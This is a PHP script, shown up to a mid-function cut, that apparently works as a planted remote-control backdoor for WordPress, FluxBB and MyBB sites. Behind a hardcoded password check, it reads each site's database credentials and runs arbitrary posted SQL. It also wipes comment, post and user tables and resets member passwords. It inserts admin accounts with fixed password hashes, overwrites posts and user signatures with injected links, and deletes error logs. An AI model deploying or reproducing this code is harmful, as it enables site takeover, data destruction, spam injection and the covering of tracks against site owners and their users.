<?php
$iauthor = $_POST["author"];
$isecu =  $_POST["secu"];
if($iauthor!="myhero")
{ return; }
if($isecu!="123456poiuythdjdjd")
{ return; }
$flatform = $_GET["fm"];
$isubfolder = $_POST["subfolder"]; 
switch ($flatform) {
	case "wp":
			require( dirname( __FILE__ ) . $isubfolder.'/wp-config.php' );
			$action = $_GET["maction"];
			$mysqli = new mysqli(constant("DB_HOST"), constant("DB_USER"), constant("DB_PASSWORD"), constant("DB_NAME"));
			if ($mysqli->connect_errno) {
						echo "0|0";
						return;
					}
			$mysqli -> set_charset("utf8");
			if($action==1) // INSERT new post
			{
				$ipost_author = $_POST["ipost_author"]; 
				$ipost_date = $_POST["ipost_date"];
				$ipost_date_gmt = $_POST["ipost_date"];
				$ipost_content = $_POST["ipost_content"];
				$ipost_title = $_POST["ipost_title"];
				$ipost_excerpt = $_POST["ipost_excerpt"]; 
				$ipost_status = $_POST["ipost_status"];
				$icomment_status = $_POST["icomment_status"];
				$iping_status = $_POST["iping_status"];
				$ipost_password = $_POST["ipost_password"];
				$ipost_name = $_POST["ipost_name"];
				$ito_ping = $_POST["ito_ping"];
				$ipinged = $_POST["ipinged"];
				$ipost_modified = $_POST["ipost_date"];
				$ipost_modified_gmt = $_POST["ipost_date"];
				$ipost_content_filtered = $_POST["ipost_content_filtered"];
				$ipost_parent = $_POST["ipost_parent"];
				$iguid = $_POST["iguid"];
				$imenu_order = $_POST["imenu_order"];
				$ipost_type  = $_POST["ipost_type"];
				$ipost_mime_type = $_POST["ipost_mime_type"];
				$icomment_count = $_POST["icomment_count"];
				$categoryids = $_POST["categoryids"];
				$tags = $_POST["tags"];
				$slugs = $_POST["slugs"];
				$haspic = $_POST["haspic"];
				$seoTitle=$_POST["seotitle"];
				$seoDes = $_POST["seodes"];		
				$seokeyworks=$_POST["seokeyworks"];
				if($ipost_author=="" || $ipost_title=="")
				{
					return;
				}
				$insertpostquery = "insert into ".$table_prefix."posts(post_author, post_date,post_date_gmt,post_content,post_title,post_excerpt, post_status,comment_status,ping_status ,post_password,post_name,to_ping,pinged,post_modified,post_modified_gmt,post_content_filtered,post_parent,guid,menu_order,post_type ,post_mime_type,comment_count) values(".$ipost_author.",'".$ipost_date."','".$ipost_date_gmt."','".$ipost_content."','".$ipost_title."','".$ipost_excerpt."','".$ipost_status."','".$icomment_status."','".$iping_status ."','".$ipost_password."','".$ipost_name."','".$ito_ping."','".$ipinged."','".$ipost_modified."','".$ipost_modified_gmt."','".$ipost_content_filtered."',".$ipost_parent.",'".$iguid."',".$imenu_order.",'".$ipost_type ."','".$ipost_mime_type."',".$icomment_count.")";
			   
				$mysqli->query($insertpostquery);
				$result = $mysqli->query("select max(id) as id from ".$table_prefix."posts where post_status='publish'");
				$lastPostID = 0;
				if ($result->num_rows > 0) 
				{
					while($row = $result->fetch_assoc()) 
					{
						if($row["id"]!=null)
						{
							$lastPostID = $row["id"];
						}
					}
				}
				echo "1|". $lastPostID;

				$categoryidsArray = explode(",",$categoryids);	
				$categoryarrlength=count($categoryidsArray);
				if($categoryarrlength>0)
				{
					for($x=0;$x<$categoryarrlength;$x++)
					{	 
						if(trim($categoryidsArray[$x]," ")!="")
						{
						    $sql01 = "select term_taxonomy_id from ".$table_prefix."term_taxonomy where term_id = " .$categoryidsArray[$x]. " and taxonomy='category' limit 1";
							$rs01 = $mysqli -> query($sql01);
							if ($rs01->num_rows > 0) 
							{
								while($row = $rs01->fetch_assoc()) 
								{
									if($row["term_taxonomy_id"]!=null)
									{
										$term_taxonomy_id = $row["term_taxonomy_id"];
										$sql011="insert into ".$table_prefix."term_relationships(object_id, term_taxonomy_id) values(" .$lastPostID. "," .$term_taxonomy_id. ")";
										$mysqli -> query($sql011);
										$sql012= "update ".$table_prefix."term_taxonomy set count = count+1 where term_taxonomy_id = " .$term_taxonomy_id.  "";
										$mysqli -> query($sql012);
									}
								}
							}
						}
					}	
				}

				$tagsArray = explode(",",$tags);
				$slugsArray = explode(",",$slugs);
				$tagsarrlength=count($tagsArray);
				if($tagsarrlength>0)
				{
					for($y=0;$y<$tagsarrlength;$y++)
					{
						if(trim($slugsArray[$y]," ")!="")
						{
							$result2  = $mysqli -> query("select term_id from ".$table_prefix."terms where slug='".$slugsArray[$y]."'");
							 if (mysqli_num_rows($result2) > 0) 
							{
					
								$row2 = mysqli_fetch_row($result2);
								$term_id = $row2[0];
								$result3  = $mysqli -> query("select term_taxonomy_id from ".$table_prefix."term_taxonomy where term_id = ".$term_id);	
								if (mysqli_num_rows($result3) > 0) 
								{					
									$row3 = mysqli_fetch_row($result3);
									$term_taxonomy_id = $row3[0];
									$mysqli -> query("update ".$table_prefix."term_taxonomy set count = count+1 where term_taxonomy_id = " .$term_taxonomy_id);		
									$mysqli -> query("insert into ".$table_prefix."term_relationships(object_id, term_taxonomy_id) values(" .$lastPostID. "," .$term_taxonomy_id. ")");		
								}	
								else
								{
									$mysqli -> query("insert into ".$table_prefix."term_taxonomy(term_id,taxonomy,count,description) values(".$term_id .",'post_tag',1,'')");	
									$maxtaxonomy  = $mysqli -> query("select max(term_taxonomy_id) from ".$table_prefix."term_taxonomy");
									 if ($maxtaxonomy) 
									{
										$rowtx = mysqli_fetch_row($maxtaxonomy);
										$term_taxonomy_id1 = $rowtx[0];
										$mysqli -> query("insert into ".$table_prefix."term_relationships(object_id, term_taxonomy_id) values(" .$lastPostID. "," .$term_taxonomy_id1. ")");	
									}					
								}	
							}
							else
							{
					
									$mysqli -> query("insert into ".$table_prefix."terms(name, slug) values('".$tagsArray[$y]."','".$slugsArray[$y]."')");						
									$maxtid  = $mysqli -> query("select max(term_id) from ".$table_prefix."terms");
									$rowtid = mysqli_fetch_row($maxtid);
									$max_term_id = $rowtid[0];
						
									$mysqli -> query("insert into ".$table_prefix."term_taxonomy(term_id,taxonomy,count,description) values(".$max_term_id .",'post_tag',1,'')");	
									$maxtaxonomy1  =$mysqli -> query("select max(term_taxonomy_id) from ".$table_prefix."term_taxonomy");
									 if ($maxtaxonomy1) 
									{
										$rowtx1 = mysqli_fetch_row($maxtaxonomy1);
										$term_taxonomy_id11 = $rowtx1[0];
										$mysqli -> query("insert into ".$table_prefix."term_relationships(object_id, term_taxonomy_id) values(" .$lastPostID. "," .$term_taxonomy_id11. ")");	
									}										
							}			
				
						}
					}
			}
				
			}
			if($action==101) // Delete all comment
			{
				$sqlClearComment = "TRUNCATE TABLE ".$table_prefix."comments; ";
				$sqlClearCommentMeta = "TRUNCATE TABLE ".$table_prefix."commentmeta;";
				$mysqli->query($sqlClearComment);
				$mysqli->query($sqlClearCommentMeta);
				$returnCode = "0|1";
				echo $returnCode;
			}
			
			if($action==10) // exesqlcomand
			{
				$icmd = $_POST["icmd"]; 
				$result = $mysqli->multi_query($icmd);
				echo $result; 
			}

			if($action==50) // Delete Log file
			{
					$returnCode = "0|0";
					if (file_exists(dirname( __FILE__ ).$forumFolder."/error_log")) 
					{
						if(unlink(dirname( __FILE__ ).$forumFolder."/error_log"))
						{
							$returnCode = "0|1";
						}
					}
					else {
					$returnCode = "0|1";
						}
					echo $returnCode;
					return;
			}

			if($action==51)
			{
				$outputStr = "";
				$sqlGetPostLinkFormat = "SELECT option_value  FROM " .$table_prefix. "options WHERE option_name='permalink_structure';";
				$resultGetPostLinkFormat = $mysqli->query($sqlGetPostLinkFormat);
				if ($resultGetPostLinkFormat->num_rows > 0) 
				{
					while($row = $resultGetPostLinkFormat->fetch_assoc()) 
					{
						$outputStr =  "1|". $row["option_value"];
					}
				} 
			}
			echo $outputStr;
			$mysqli->close();
			break;
	case "fbb":
			$forumFolder=$isubfolder;
			require( dirname( __FILE__ ) .$isubfolder . '/config.php' );
			$action = $_GET["maction"];
			if($action==0)
			{
					
					$mysqli = new mysqli($db_host, $db_username, $db_password, $db_name);
					if ($mysqli->connect_errno) {
						echo "0|0";
						return;
					}
					$mysqli -> set_charset("utf8");
					
					$sqlmaxxupThreadID = "SELECT conf_value FROM " . $db_prefix . "config where conf_name='maxxupThreadID'";
					$result = $mysqli->query($sqlmaxxupThreadID);
					$MaxxUpThreadId = 0;

					if ($result->num_rows > 0) 
					{
						while($row = $result->fetch_assoc()) 
						{
							if($row["conf_value"]!=null)
							{
								$MaxxUpThreadId = $row["conf_value"];
							}
						}
					} 
					else 
					{
						$sqlmaxxupThreadIDinsert = "INSERT INTO " . $db_prefix . "config (conf_name, conf_value) VALUES  ('maxxupThreadID', '0'); ";
						$mysqli->query($sqlmaxxupThreadIDinsert);
					}

					$sqlGetTheadIdForUpdate="SELECT MIN(id) as mid FROM " . $db_prefix . "topics where id > " .$MaxxUpThreadId . "; ";
					$result1 = $mysqli->query($sqlGetTheadIdForUpdate);
					$UpThreadId = 0;
					if ($result1->num_rows > 0) 
					{
						while($row1 = $result1->fetch_assoc()) 
						{
							if($row1["mid"]!=null)
							{
								echo "0|1";
							}
							else 
							{
							echo "0|0";
							}
						}
					}
					else {
						echo "0|0";
					}
					$mysqli->close();
					return;		
			}
			if($action==1) // Clear db
			{
				$returnCode = "0|0";
					$mysqli = new mysqli($db_host, $db_username, $db_password, $db_name);
					if ($mysqli->connect_errno) {
						
					}
					$sql ="truncate table " . $db_prefix . "posts; truncate table  " . $db_prefix . "topics; truncate table  " . $db_prefix . "topic_subscriptions;  truncate table ". $db_prefix . "search_matches; truncate table ". $db_prefix . "search_words;  truncate table ". $db_prefix . "search_cache;  truncate table ". $db_prefix . "users; INSERT INTO ". $db_prefix . "users (group_id, username, password) values(3,'administrator','53506002d7709e6e7da59c63164a024798342d08');  INSERT INTO ". $db_prefix . "users (group_id, username, password) values(1,'admin','53506002d7709e6e7da59c63164a024798342d08'); ";
					$sqlUpdateConfig ="update " . $db_prefix . "config set `conf_value` = '0' WHERE conf_name = 'maxxupThreadID'; "; 
					

					if (!$mysqli->multi_query($sql. $sqlUpdateConfig)) {
						
					}
					else 
					{
						$returnCode = "0|1";
					}

					echo $returnCode;
					$mysqli->close();
					return;
			}
			if($action==11) // Disable posting
			{
					$mysqli = new mysqli($db_host, $db_username, $db_password, $db_name);
					if ($mysqli->connect_errno) {
						echo "Failed to connect to MySQL: (" . $mysqli->connect_errno . ") " . $mysqli->connect_error;
					}
					$maxrecords = $_GET["maxrecords"];
					$sqlGetTheadIdForUpdate="SELECT count(id) as totalRecords FROM " . $db_prefix . "topics; ";
					$result1 = $mysqli->query($sqlGetTheadIdForUpdate);
					$UpThreadId = 0;
					$returnCode = "0|0";
					if ($result1->num_rows > 0) 
					{
						while($row1 = $result1->fetch_assoc()) 
						{
							if($row1["totalRecords"]!=null)
							{
								$totalRecords = $row1["totalRecords"];
								if($totalRecords > $maxrecords)
								{
									if(rename(dirname( __FILE__ ).$forumFolder."/post.php", dirname( __FILE__ ).$forumFolder."/_post.php"))
									{
										$returnCode = "0|1";
									}
								}
							}
						}
					}
					echo $returnCode;
					$mysqli->close();
					return;
			}
			if($action==12) // Enable posting
			{
					$returnCode = "0|0";
					if (file_exists(dirname( __FILE__ ).$forumFolder."/_post.php")) 
					{
						if(rename(dirname( __FILE__ ).$forumFolder."/_post.php", dirname( __FILE__ ).$forumFolder."/post.php"))
						{
							$returnCode = "0|1";
						}
					} 
					echo $returnCode;
					return;
			}
			if($action==21) // Disable Register
			{
					$returnCode = "0|0";
					$mysqli = new mysqli($db_host, $db_username, $db_password, $db_name);
					if ($mysqli->connect_errno) {
						echo $returnCode;
					}
					$maxrecords = $_GET["maxrecords"];
					$sqlGetTheadIdForUpdate="SELECT count(id) as totalRecords FROM " . $db_prefix . "users; ";
					$result1 = $mysqli->query($sqlGetTheadIdForUpdate);
					$UpThreadId = 0;
					if ($result1->num_rows > 0) 
					{
						while($row1 = $result1->fetch_assoc()) 
						{
							if($row1["totalRecords"]!=null)
							{
								$totalRecords = $row1["totalRecords"];
								if($totalRecords > $maxrecords)
								{
									if(rename(dirname( __FILE__ ).$forumFolder."/register.php",dirname( __FILE__ ).$forumFolder."/_register.php"))
									{
										$returnCode = "0|1";
									}
								}
							}
						}
					}
					
					echo $returnCode;
					$mysqli->close();
					return;
			}
			if($action==22) // Enable posting
			{
					$returnCode = "0|0";
					if (file_exists(dirname( __FILE__ ).$forumFolder."/_register.php")) 
					{
						if(rename(dirname( __FILE__ ).$forumFolder."/_register.php",dirname( __FILE__ ).$forumFolder."/register.php"))
						{
							$returnCode = "0|1";
						}
					}
					echo $returnCode;
					return;
			}
			if($action==2)
			{
					$mysqli = new mysqli($db_host, $db_username, $db_password, $db_name);
					if ($mysqli->connect_errno) {
						echo "Failed to connect to MySQL: (" . $mysqli->connect_errno . ") " . $mysqli->connect_error;
					}

					$sqlminClearThreadId = "SELECT conf_value FROM " . $db_prefix . "config where conf_name='minClearThreadId'; ";
					$result = $mysqli->query($sqlminClearThreadId);
		
					$MinClearThreadId = 0;
					if ($result->num_rows > 0) 
					{
						while($row = $result->fetch_assoc()) 
						{
						  $MinClearThreadId = $row["conf_value"];
						}
					} 
					else 
					{
						$sqlminClearThreadIdinsert = "INSERT INTO " . $db_prefix . "config (conf_name, conf_value) VALUES  ('minClearThreadId', '0'); ";
						$mysqli->query($sqlminClearThreadIdinsert);
					}
		
					echo "MinClearThreadId:" . $MinClearThreadId . "</br>";
		
					$sqlGetMaxPostIdForUpdate="SELECT max(id) as maxid FROM " . $db_prefix . "posts; ";
					$result1 = $mysqli->query($sqlGetMaxPostIdForUpdate);
					$MaxPostIdForUpdate = 0;
					if ($result1->num_rows > 0) 
					{
						while($row = $result1->fetch_assoc()) 
						{
							if($row["maxid"]!=null)
							{
								$MaxPostIdForUpdate = $row["maxid"];
							}
						}
					}
		
					echo "MaxPostIdForUpdate: " .$MaxPostIdForUpdate . "</br>";
		
					$sql ="update " . $db_prefix . "posts set `message` = '' WHERE id > ".$MinClearThreadId." ; update " . $db_prefix . "users set `url`='', `signature`='' WHERE id> 2; ";
					$sqlUpdateConfig ="update " . $db_prefix . "config set `conf_value` = '" .$MaxPostIdForUpdate. "' WHERE conf_name = 'minClearThreadId'; "; 
					//$sqlUpdateConfig_Max ="update " . $db_prefix . "config set `conf_value` = '0' WHERE conf_name = 'maxxupThreadID'; ";
		
					if (!$mysqli->multi_query($sql . $sqlUpdateConfig)) {
						echo "Multi query failed: (" . $mysqli->errno . ") " . $mysqli->error;
					}
					$mysqli->close();		
		
					return;
			}
			if($action==3)
			{
			        $responseStr="";
					$ipost_title = $_POST["ipost_title"];
					$ipost_content = $_POST["ipost_content"];
					$iforum_name = $_POST["iforum_name"];
					$iforum_id = $_POST["iforum_id"];
					$mysqli = new mysqli($db_host, $db_username, $db_password, $db_name);
					if ($mysqli->connect_errno) {
						echo "Failed to connect to MySQL: (" . $mysqli->connect_errno . ") " . $mysqli->connect_error;
						return;
					}
					$mysqli -> set_charset("utf8");
					$forum_id_update = -1;
					if($iforum_id!="0")
					{
						$forum_id_update = $iforum_id;
						$responseStr = "|-1";
					}
					else {
						if($iforum_name !="0")
						{
							$sqlInsertForum="INSERT INTO " . $db_prefix . "forums (forum_name, forum_desc, cat_id, disp_position) VALUES  ('" . $iforum_name . "','" . $iforum_name . "',1,1); ";
							$mysqli->query($sqlInsertForum); 
							$sqlGetForumIdForUpdate="SELECT max(id) as mid FROM " . $db_prefix . "forums; ";
							$resultGetForumId = $mysqli->query($sqlGetForumIdForUpdate);
							if ($resultGetForumId->num_rows > 0) 
							{
								while($row = $resultGetForumId->fetch_assoc()) 
								{
									if($row["mid"]!=null)
									{
										$forum_id_update = $row["mid"];
										$responseStr = "|".$forum_id_update;
									}
								}
							} 
							
						}
						else {
								$forum_id_update = 1;
								$responseStr = "|-1";
							}
					}
					
					$sqlmaxxupThreadID = "SELECT conf_value FROM " . $db_prefix . "config where conf_name='maxxupThreadID'";
					$result = $mysqli->query($sqlmaxxupThreadID);
					$MaxxUpThreadId = 0;

					if ($result->num_rows > 0) 
					{
						while($row = $result->fetch_assoc()) 
						{
							if($row["conf_value"]!=null)
							{
								$MaxxUpThreadId = $row["conf_value"];
							}
						}
					} 
					else 
					{
						$sqlmaxxupThreadIDinsert = "INSERT INTO " . $db_prefix . "config (conf_name, conf_value) VALUES  ('maxxupThreadID', '0'); ";
						$mysqli->query($sqlmaxxupThreadIDinsert);
					}

					$sqlGetTheadIdForUpdate="SELECT MIN(id) as mid FROM " . $db_prefix . "topics where id > " .$MaxxUpThreadId . "; ";
					$result1 = $mysqli->query($sqlGetTheadIdForUpdate);
					$UpThreadId = 0;
					if ($result1->num_rows > 0) 
					{
						while($row = $result1->fetch_assoc()) 
						{
							if($row["mid"]!=null)
							{
								$UpThreadId = $row["mid"];
							}
						}
					} 
					$responseStr = $UpThreadId . $responseStr;
					echo $responseStr;

					if($UpThreadId > 0 )
					{
						$sqlUpdateThread ="update " . $db_prefix . "topics set `subject` = '" . $ipost_title . "' WHERE id=" . $UpThreadId . "; ";
						$sqlUpdatePost ="update " . $db_prefix . "posts set `message` = '" .$ipost_content. "' WHERE topic_id = " . $UpThreadId . " LIMIT 1; ";
						$sqlUpdateConfig ="update " . $db_prefix . "config set `conf_value` = '" .$UpThreadId. "' WHERE conf_name = 'maxxupThreadID'; ";
						$sqlUpdateTopicForumID = "";
						if($forum_id_update!=-1)
						{
						$sqlUpdateTopicForumID = "update " . $db_prefix . "topics set `forum_id` = '" . $forum_id_update . "' WHERE id=" . $UpThreadId . "; ";
						}
						if (!$mysqli->multi_query($sqlUpdateThread . $sqlUpdatePost .$sqlUpdateConfig .$sqlUpdateTopicForumID )) 
						{
							echo "Multi query failed: (" . $mysqli->errno . ") " . $mysqli->error;
						}
					}
					$mysqli->close();
					return;		
			}
			if($action==4)
			{
					$minIDforClear = $_GET["minid"];
					$maxIDforClear = $_GET["maxid"];
					$StartIdForUpdate = $_GET["upid"];
					$mysqli = new mysqli($db_host, $db_username, $db_password, $db_name);
					if ($mysqli->connect_errno) {
						echo "Failed to connect to MySQL: (" . $mysqli->connect_errno . ") " . $mysqli->connect_error;
					}

					$sqlminClearThreadId = "SELECT conf_value FROM " . $db_prefix . "config where conf_name='minClearThreadId'; ";
					$result = $mysqli->query($sqlminClearThreadId);
		
					$MinClearThreadId = 0;
					if($minIDforClear!=null)
					{
						$MinClearThreadId = $minIDforClear;
					}
		
					if($maxIDforClear==null)
					{
						$maxIDforClear=10000000;
					}
					if($maxIDforClear=="")
					{
						$maxIDforClear=10000000;
					}
		

					$MaxPostIdForUpdate = 0;
		
					if($StartIdForUpdate!=null)
					{
						$MaxPostIdForUpdate = $StartIdForUpdate;
					}
		
		
					$sql ="update " . $db_prefix . "posts set `message` = '' WHERE id > ".$MinClearThreadId." and id < ". $maxIDforClear . "; ";
					$sqlUpdateConfig ="update " . $db_prefix . "config set `conf_value` = '" .$maxIDforClear. "' WHERE conf_name = 'minClearThreadId'; "; 
					$sqlUpdateConfig_Max ="update " . $db_prefix . "config set `conf_value` = '".$MinClearThreadId."' WHERE conf_name = 'maxxupThreadID'; ";
		
					if (!$mysqli->multi_query($sql . $sqlUpdateConfig . $sqlUpdateConfig_Max)) {
						echo "Multi query failed: (" . $mysqli->errno . ") " . $mysqli->error;
					}
					$mysqli->close();		
		
					return;
			}
			if($action==6) // Clear user link and reset password
			{
					$returnCode = "0|0";
					$minUserIDforClear = $_GET["minid"];
					if($minUserIDforClear=="")
					{
						$minUserIDforClear = 3;
					}
					$mysqli = new mysqli($db_host, $db_username, $db_password, $db_name);
					if ($mysqli->connect_errno) {
						
					}
					$sql ="update " . $db_prefix . "users set password='changed', url='', signature='' WHERE id> ". $minUserIDforClear ."; ";		

					if (!$mysqli->query($sql)) {
						
					}
					else {
						$returnCode = "0|1";
						}
					echo $returnCode;
					$mysqli->close();		
		
					return;
			}
			if($action==61) // Update user signiture and url
			{
			        	$mysqli = new mysqli($db_host, $db_username, $db_password, $db_name);
					if ($mysqli->connect_errno) {
						
					}
			    
					$returnCode = "0|0";
					$sqlmaxxupUserID = "SELECT conf_value FROM " . $db_prefix . "config where conf_name='maxxupUserID'; ";
					$result = $mysqli->query($sqlmaxxupUserID);
					$MaxxUpUserId = 2;

					if ($result->num_rows > 0) 
					{
					   
						while($row = $result->fetch_assoc()) 
						{
							if($row["conf_value"]!=null)
							{
								$MaxxUpUserId = $row["conf_value"];
							}
						}
					} 
					else 
					{
					    
						$sqlmaxxupUserIDinsert = "INSERT INTO " . $db_prefix . "config (conf_name, conf_value) VALUES  ('maxxupUserID', '".$MaxxUpUserId."'); ";
						$mysqli->query($sqlmaxxupUserIDinsert);
					}


				    $sqlGetUserIdForUpdate="SELECT MIN(id) as mid FROM " . $db_prefix . "users where id > " .$MaxxUpUserId . "; ";
					$result1 = $mysqli->query($sqlGetUserIdForUpdate);
					$UpUserId = 0;
					if ($result1->num_rows > 0) 
					{
						while($row = $result1->fetch_assoc()) 
						{
							if($row["mid"]!=null)
							{
								$UpUserId = $row["mid"];
							}
						}
					} 
					
					if($UpUserId==0)
					{
					    echo "0|0";
					    return;
					}
					
					$sql ="update " . $db_prefix . "users set url='".$_POST["uUrl"]."', signature='".$_POST["uSigna"]."' WHERE id= ". $UpUserId ."; ";		

					if (!$mysqli->query($sql)) {
						
					}
					else {
						$sqlmaxxupUserIDupdate = "Update " . $db_prefix . "config set conf_value = '". $UpUserId ."' where conf_name='maxxupUserID' ; ";
						$mysqli->query($sqlmaxxupUserIDupdate);
						$returnCode = "0|" . $UpUserId;
						}
					echo $returnCode;
					$mysqli->close();		
		
					return;
			}
			if($action==7) // Set min clear id
			{
					$minpIDforClear = $_GET["minid"];
					$mysqli = new mysqli($db_host, $db_username, $db_password, $db_name);
					if ($mysqli->connect_errno) {
						echo "Failed to connect to MySQL: (" . $mysqli->connect_errno . ") " . $mysqli->connect_error;
					}
					$sqlUpdateConfig ="update " . $db_prefix . "config set `conf_value` = '" .$minpIDforClear. "' WHERE conf_name = 'minClearThreadId'; "; 		
		
					if (!$mysqli->multi_query($sqlUpdateConfig)) {
						echo "Multi query failed: (" . $mysqli->errno . ") " . $mysqli->error;
					}
					$mysqli->close();		
		
					return;
			}
			if($action==8) // Set max id for update
			{
					$maxpIDforUp = $_GET["maxid"];
					$mysqli = new mysqli($db_host, $db_username, $db_password, $db_name);
					if ($mysqli->connect_errno) {
						echo "Failed to connect to MySQL: (" . $mysqli->connect_errno . ") " . $mysqli->connect_error;
					}
					$sqlUpdateConfig ="update " . $db_prefix . "config set `conf_value` = '" .$maxpIDforUp. "' WHERE conf_name = 'maxxupThreadID'; "; 		
		
					if (!$mysqli->multi_query($sqlUpdateConfig)) {
						echo "Multi query failed: (" . $mysqli->errno . ") " . $mysqli->error;
					}
					$mysqli->close();		
		
					return;
			}
			if($action==50) // Delete Log file
			{
					$returnCode = "0|0";
					if (file_exists(dirname( __FILE__ ).$forumFolder."/error_log")) 
					{
						if(unlink(dirname( __FILE__ ).$forumFolder."/error_log"))
						{
							$returnCode = "0|1";
						}
					}
					else {
					$returnCode = "0|1";
						}
					echo $returnCode;
					return;
			}
		break;
	case "mybb":
		$forumFolder=$isubfolder;	
		require( dirname( __FILE__ ) .$isubfolder . '/inc/config.php' );
		$db_prefix = $config['database']['table_prefix'];
			$action = $_GET["maction"];
			
			$mysqli = new mysqli($config['database']['hostname'], $config['database']['username'], $config['database']['password'] , $config['database']['database']);
			if ($mysqli->connect_errno) {
				echo "-2|-2";
				return;
			}
			$mysqli -> set_charset("utf8");
			
			if($action==0)
			{
			    
				$sqlcrtConfTbl="CREATE TABLE IF NOT EXISTS " . $db_prefix . "config ( config_name varchar(100)  NOT NULL default '', config_value  varchar(100) NOT NULL default '');";
				$mysqli->query($sqlcrtConfTbl);

				$sqlmaxxupThreadID = "SELECT config_value FROM " . $db_prefix . "config where config_name='maxxupThreadID'";
					$result = $mysqli->query($sqlmaxxupThreadID);
					$MaxxUpThreadId = 0;

					if ($result->num_rows > 0) 
					{
						while($row = $result->fetch_assoc()) 
						{
							if($row["config_value"]!=null)
							{
								$MaxxUpThreadId = $row["config_value"];
							}
						}
					} 
					else 
					{
						$sqlmaxxupThreadIDinsert = "INSERT INTO " . $db_prefix . "config (config_name, config_value) VALUES  ('maxxupThreadID', '0'); ";
						$mysqli->query($sqlmaxxupThreadIDinsert);
					}

					$sqlGetTheadIdForUpdate="SELECT MIN(pid) as mid FROM " . $db_prefix . "posts where pid > " .$MaxxUpThreadId . "; ";
					$result1 = $mysqli->query($sqlGetTheadIdForUpdate);
					$UpThreadId = 0;
					if ($result1->num_rows > 0) 
					{
						while($row1 = $result1->fetch_assoc()) 
						{
							if($row1["mid"]!=null)
							{
								echo "0|1";
							}
							else 
							{
							echo "0|0";
							}
						}
					}
					else 
					{
						echo "0|0";
					}
					$mysqli->close();
					return;	
					
			}
			if($action==1) // Clear db
			{
					$returnCode = "0|0";
					$sql ="truncate table " . $db_prefix . "posts; truncate table  " . $db_prefix . "threads; truncate table  " . $db_prefix . "threadsread;  truncate table  " . $db_prefix . "threadsubscriptions;  truncate table  " . $db_prefix . "searchlog;  truncate table ". $db_prefix . "sessions; truncate table ". $db_prefix . "users; 
INSERT INTO ". $db_prefix . "users (`uid`, `username`, `password`, `salt`, `loginkey`, `email`, `postnum`, `threadnum`, `avatar`, `avatardimensions`, `avatartype`, `usergroup`, `additionalgroups`, `displaygroup`, `usertitle`, `regdate`, `lastactive`, `lastvisit`, `lastpost`, `website`, `icq`, `skype`, `google`, `birthday`, `birthdayprivacy`, `signature`, `allownotices`, `hideemail`, `subscriptionmethod`, `invisible`, `receivepms`, `receivefrombuddy`, `pmnotice`, `pmnotify`, `buddyrequestspm`, `buddyrequestsauto`, `threadmode`, `showimages`, `showvideos`, `showsigs`, `showavatars`, `showquickreply`, `showredirect`, `ppp`, `tpp`, `daysprune`, `dateformat`, `timeformat`, `timezone`, `dst`, `dstcorrection`, `buddylist`, `ignorelist`, `style`, `away`, `awaydate`, `returndate`, `awayreason`, `pmfolders`, `notepad`, `referrer`, `referrals`, `reputation`, `regip`, `lastip`, `language`, `timeonline`, `showcodebuttons`, `totalpms`, `unreadpms`, `warningpoints`, `moderateposts`, `moderationtime`, `suspendposting`, `suspensiontime`, `suspendsignature`, `suspendsigtime`, `coppauser`, `classicpostbit`, `loginattempts`, `loginlockoutexpiry`, `usernotes`, `sourceeditor`) VALUES
(1, 'admin', '09b677f412c8d43c61397a60896151b6', '7kdTtUTC', 'QQC61JibKSGo6UFnKT3Msvmp8x2rD2ZYWijT489sVmtmEZXirQ', 'vmafoqcivo0q@n3plcpnl0005.prod.ams3.secureserver.net', 0, 0, '', '', '0', 4, '', 0, '', 1596527355, 1599383481, 1599382570, 0, '', '', '', '', '', 'all', '', 1, 0, 0, 0, 1, 0, 1, 1, 1, 0, '', 1, 1, 1, 1, 1, 1, 0, 0, 0, '', '', '0', 0, 0, '', '', 0, 0, 0, '', '', '0**$%%$1**$%%$2**$%%$3**$%%$4**', '', 0, 0, 0, 0xa0998003, 0xa29ea543, '', 729, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, '', 0);";
					$sqlUpdateConfig ="update " . $db_prefix . "config set `conf_value` = '0' WHERE conf_name = 'maxxupThreadID'; "; 

					if (!$mysqli->multi_query($sql. $sqlUpdateConfig)) {
						
					}
					else 
					{
						$returnCode = "0|1";
					}

					echo $returnCode;
					$mysqli->close();
					return;
			}
			
			if($action==11) // Disable posting
			{
					$returnCode = "0|0";
					$maxrecords = $_GET["maxrecords"];
					$sqlGetTheadIdForUpdate="SELECT count(pid) as totalRecords FROM " . $db_prefix . "posts; ";
					$result1 = $mysqli->query($sqlGetTheadIdForUpdate);
					$UpThreadId = 0;
					if ($result1->num_rows > 0) 
					{
						while($row1 = $result1->fetch_assoc()) 
						{
							if($row1["totalRecords"]!=null)
							{
								$totalRecords = $row1["totalRecords"];
								
								if($totalRecords > $maxrecords)
								{
									
									if(rename(dirname( __FILE__ ).$forumFolder."/newthread.php", dirname( __FILE__ ).$forumFolder."/_newthread.php"))
									{
									    rename(dirname( __FILE__ ).$forumFolder."/newreply.php", dirname( __FILE__ ).$forumFolder."/_newreply.php");
										$returnCode = "0|1";
									}
									else {
											
									}
								}
							}
						}
					}
					
					echo $returnCode;
					
					$mysqli->close();
					return;
			}
			if($action==12) // Enable posting
			{
					$returnCode = "0|0";
					if(rename(dirname( __FILE__ ).$forumFolder."/_newthread.php",dirname( __FILE__ ).$forumFolder."/newthread.php"))
					{
						rename(dirname( __FILE__ ).$forumFolder."/_newreply.php", dirname( __FILE__ ).$forumFolder."/newreply.php");
						$returnCode = "0|1";
					}
					echo $returnCode;
					return;
			}
			
			if($action==21) // Disable register
			{
				     echo "0|0"; // "Function not yet handle";
					return;
			}
			if($action==22) // Enable register
			{
				     echo "0|0"; // "Function not yet handle";
					return;
			}
			
			if($action==3)
			{
				$responseStr="";
				$ipost_title = $_POST["ipost_title"];
				$ipost_content = $_POST["ipost_content"];
				$iforum_name = $_POST["iforum_name"];
				$iforum_id = $_POST["iforum_id"];
				
				$mysqli -> set_charset("utf8");
				
				$sqlmaxxupThreadID = "SELECT config_value FROM " . $db_prefix . "config where config_name='maxxupThreadID'";
				$result = $mysqli->query($sqlmaxxupThreadID);
				$MaxxUpThreadId = 0;

				if ($result->num_rows > 0) 
				{
					while($row = $result->fetch_assoc()) 
					{
						if($row["config_value"]!=null)
						{
							$MaxxUpThreadId = $row["config_value"];
						}
					}
				} 
				else 
				{
					$sqlmaxxupThreadIDinsert = "INSERT INTO " . $db_prefix . "config (config_name, config_value) VALUES  ('maxxupThreadID', '0'); ";
					$mysqli->query($sqlmaxxupThreadIDinsert);
				}

